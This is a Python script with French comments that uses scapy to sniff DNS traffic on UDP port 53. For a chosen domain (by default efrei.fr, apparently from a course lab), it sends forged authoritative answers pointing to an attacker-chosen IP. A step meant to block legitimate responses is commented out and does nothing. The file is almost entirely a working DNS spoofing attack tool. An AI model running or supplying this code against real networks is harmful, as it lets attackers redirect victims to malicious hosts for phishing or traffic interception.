from scapy.all import *
import argparse

def dns_spoof(packet):
    """Intercepte les requêtes DNS et répond avec une adresse IP usurpée, en bloquant les réponses légitimes avec drop."""
    
    # Vérifie si le paquet est une requête DNS
    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # C'est une requête DNS
        query_name = packet[DNS].qd.qname.decode('utf-8')

        print(f"Requête pour le domaine : {query_name}")
        
        # Vérifie si le nom de domaine correspond à celui que nous voulons usurper
        if query_name == domain:
            print(f"Interception de la requête DNS pour {query_name}. Envoi de la réponse usurpée.")
            
            # Crée une réponse DNS usurpée
            response = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                       UDP(sport=53, dport=packet[UDP].sport) / \
                       DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, \
                           an=DNSRR(rrname=query_name, rdata=response_ip, ttl=10))
            
            # Envoie la réponse DNS usurpée
            send(response, verbose=False)
        else:
            print(f"Requête pour un autre domaine : {query_name}. Passage sans intervention.")
    
    # Vérifie si c'est une réponse DNS
    elif packet.haslayer(DNS) and packet[DNS].qr == 1:  # C'est une réponse DNS
        query_name = packet[DNS].qd.qname.decode('utf-8')
        
        # Bloque les réponses DNS légitimes pour le domaine ciblé en utilisant drop()
        if query_name == domain:
            print(f"Réponse DNS légitime pour {query_name} bloquée.")
            #packet.drop()  # Drop the packet to stop further processing
            #drop(packet)  # Bloque le paquet DNS légitime en utilisant drop()
        else:
            print(f"Réponse DNS pour {query_name} autorisée.")
            # Aucune action, la réponse est autorisée à passer

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script de spoofing DNS")
    parser.add_argument("--domain", default="efrei.fr", help="Nom de domaine à usurper (par défaut: efrei.fr)")
    parser.add_argument("--ip", default="13.37.13.37", help="Adresse IP à renvoyer (par défaut: 13.37.13.37)")
    
    args = parser.parse_args()
    
    domain = f"{args.domain}."
    response_ip = args.ip
    
    print(f"Écoute des requêtes DNS pour le domaine {domain}...")
    
    # Sniffer les paquets sur le port UDP 53, où passent les requêtes DNS
    sniff(filter="udp port 53", prn=dns_spoof, store=0)

